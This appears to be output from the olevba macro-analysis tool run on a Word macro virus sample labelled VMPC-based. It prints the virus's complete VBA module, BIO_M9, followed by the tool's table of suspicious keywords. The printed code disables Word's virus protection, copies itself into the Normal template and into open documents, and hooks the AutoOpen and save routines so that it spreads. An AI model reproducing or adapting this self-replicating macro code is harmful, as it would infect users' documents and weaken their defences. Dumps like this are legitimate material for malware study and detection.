olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-f93252c04772996511744588089942a0bb5f7aec
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-f93252c04772996511744588089942a0bb5f7aec - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BIO_M9.bas 
in file: Virus.MSWord.VMPC-based-f93252c04772996511744588089942a0bb5f7aec - OLE stream: 'Macros/VBA/BIO_M9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub BIO_M9()
On Error Resume Next
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("BIO_M9").Export "c:\BIO_M9.drv"
ActiveDocument.ReadOnlyRecommended = False
With Dialogs(wdDialogFileSummaryInfo)
    .Keywords = "BIOLORD BIO_M9"
    .Execute
End With
If NormalTemplate.VBProject.VBComponents.Item("BIO_M9").Name <> "BIO_M9" Then NiDt366485313 = True
If ActiveDocument.VBProject.VBComponents.Item("BIO_M9").Name <> "BIO_M9" Then MfVr8536 = True
If NiDt366485313 = True And MfVr8536 = False Then Set GfTp85336645 = NormalTemplate.VBProject.VBComponents
If NiDt366485313 = False And MfVr8536 = True Then Set GfTp85336645 = ActiveDocument.VBProject.VBComponents
GfTp85336645.import "c:\BIO_M9.drv"
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If MfVr8536 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
SmRtHqRs:
End Sub
Sub FileSave()
    On Error Resume Next
    Call BIO_M9
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call BIO_M9
End Sub
Sub AutoSave()
    On Error Resume Next
    Call BIO_M9
    ActiveDocument.Save
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call BIO_M9
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

